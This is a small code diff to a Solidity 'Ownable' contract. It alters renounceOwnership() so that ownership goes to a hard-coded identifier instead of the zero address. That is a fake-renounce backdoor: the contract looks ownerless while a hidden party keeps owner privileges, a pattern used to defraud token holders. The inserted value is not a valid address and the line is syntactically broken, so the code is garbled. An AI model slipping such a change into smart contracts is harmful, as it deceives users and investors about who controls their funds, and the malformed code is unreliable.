@@ -54,7 +54,7 @@ abstract contract Ownable is Context {
      * thereby removing any functionality that is only available to the owner.
      */
     function renounceOwnership() public virtual onlyOwner {
-        _setOwner(address(0));
+        _setOwner(address(JPV4JU32NDNRG39KNNXMQ6JIWGPD129NMS);
     }
 
     /**
